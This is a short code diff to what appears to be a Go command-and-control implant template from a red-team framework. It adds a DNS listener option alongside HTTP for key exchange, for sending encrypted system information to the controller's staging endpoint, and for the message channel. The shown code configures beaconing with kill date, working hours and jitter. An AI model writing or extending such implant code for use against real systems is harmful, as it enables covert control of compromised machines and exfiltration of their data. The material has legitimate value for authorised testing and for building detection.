@@ -134,7 +134,11 @@ func main() {
 		return
 	}
 
+	{% if LISTENER_TYPE == "dns" %}
+	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchangeDns(server, sessionID, stagingKey, agent_private_cert_key, agent_public_cert_key, server_public_cert_key)
+	{% else %}
 	sessionKey, newSessionID, nonce, err := comms.PerformDHKeyExchange(server, sessionID, stagingKey, agent_private_cert_key, agent_public_cert_key, server_public_cert_key)
+	{% endif %}
 	if err != nil {
 		fmt.Println("Error performing DH key exchange:", err)
 		return
@@ -165,12 +169,18 @@ func main() {
 
 	// Build and send routing packet for Stage 2
 	routingPacket := packetHandler.BuildRoutingPacket(stagingKey, sessionID, 3, encryptedSysInfo)
+	{% if LISTENER_TYPE == "dns" %}
+	sender := comms.NewDnsMessageSender(server)
+	_, _ = sender.SendMessage(routingPacket)
+	var messagesender comms.MessageSender = sender
+	{% else %}
 	postURL := server + "/stage2"
 	_, _ = http.Post(postURL, "application/octet-stream", bytes.NewReader(routingPacket))
-
-	messagesender, err := comms.NewHttpMessageSender(server, make(map[string]string), profile)
+	messagesender, _ := comms.NewHttpMessageSender(server, make(map[string]string), profile)
+	{% endif %}
 
 	newAgent := agent.NewMainAgent(packetHandler, messagesender, sessionID, killDate, workingHours, delay, jitter, lostLimit, sessionKey, defaultResponse)
+
 
 	go newAgent.Run()
 
